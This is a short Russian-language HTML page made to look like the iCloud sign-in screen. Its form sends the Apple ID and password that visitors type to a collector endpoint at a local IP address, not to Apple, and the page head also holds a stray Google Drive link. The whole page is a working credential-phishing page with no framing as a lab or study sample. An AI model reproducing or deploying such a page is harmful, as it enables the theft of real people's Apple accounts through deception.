<!DOCTYPE html>
<html lang="ru">
<head>
    <a href="https://drive.google.com/file/d/1abc2defghijklmn/preview">Перейти к файлу</a>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход в iCloud</title>
    <style>
        body { font-family: Arial, sans-serif; }
        .container { width: 300px; margin: 0 auto; padding: 20px; border: 1px solid #ccc; border-radius: 5px; }
        .container h2 { text-align: center; }
        .container input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
        .container button { width: 100%; padding: 10px; background-color: #007aff; color: white; border: none; border-radius: 5px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Вход в iCloud</h2>
        <form action="http://192.168.0.105:80/collect" method="POST">
            <input type="text" name="appleId" placeholder="Apple ID" required>
            <input type="password" name="password" placeholder="Пароль" required>
            <button type="submit">Войти</button>
        </form>
    </div>
</body>
</html>
